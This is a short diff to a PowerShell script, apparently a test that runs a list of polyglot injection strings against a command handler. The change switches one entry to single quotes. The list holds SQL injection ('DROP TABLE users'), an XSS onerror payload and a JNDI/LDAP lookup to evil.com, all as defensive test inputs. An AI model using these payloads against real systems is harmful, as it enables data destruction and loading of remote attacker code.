@@ -265,7 +265,7 @@ $polyglotCommands = @(
     "pwsh -NoProfile -File scripts/test.ps1';DROP TABLE users;--"
     "pwsh -NoProfile -File scripts/test.ps1 OR 1=1--"
     "pwsh -NoProfile -File scripts/test.ps1 <img src=x onerror=alert(1)>"
-    "pwsh -NoProfile -File scripts/test.ps1 ${jndi:ldap://evil.com/a}"
+    'pwsh -NoProfile -File scripts/test.ps1 ${jndi:ldap://evil.com/a}'
 )
 
 foreach ($cmd in $polyglotCommands) {
